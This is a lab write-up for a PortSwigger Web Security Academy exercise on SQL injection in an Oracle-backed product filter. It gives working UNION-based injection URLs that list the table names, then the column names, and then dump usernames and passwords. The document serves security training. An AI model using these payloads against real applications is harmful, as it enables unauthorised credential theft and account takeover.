# Lab: SQL injection attack, listing the database contents on Oracle

| | |
|---|---|
| **Платформа / Событие** | PortSwigger Web Security Academy |
| **Категория** | sqli |
| **Сложность** | — |
| **Статус** | done |
| **Дата решения** | 2026-11-15 |
| **Ссылка на таск** | — |

Level: `PRACTITIONER`

## Description

This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.

The application has a login function, and the database contains a table that holds usernames and passwords. You need to determine the name of this table and the columns it contains, then retrieve the contents of the table to obtain the username and password of all users.

> To solve the lab, log in as the administrator user.

# Solution

List the table names with

```sql
SELECT table_name from all_tables
```

```url
/filter?category=Pets'+union+all+select+'1',table_name+from+all_tables-- -
```

The interesting one seems "USERS_RKNNZQ". 

```sql
SELECT COLUMN_NAME from all_tab_columns WHERE table_name = 'USERS_RKNNZQ'
```

```url
/filter?category=Pets'+union+all+select+'1',COLUMN_NAME+from+all_tab_columns+WHERE+table_name+=+'USERS_RKNNZQ'-- -
```

Finally:

```sql
SELECT USERNAME_NJQLJN,PASSWORD_SPCMSH from USERS_RKNNZQ
```

```url
/filter?category=Pets'+union+all+select+USERNAME_NJQLJN,PASSWORD_SPCMSH+from+USERS_RKNNZQ-- -
```

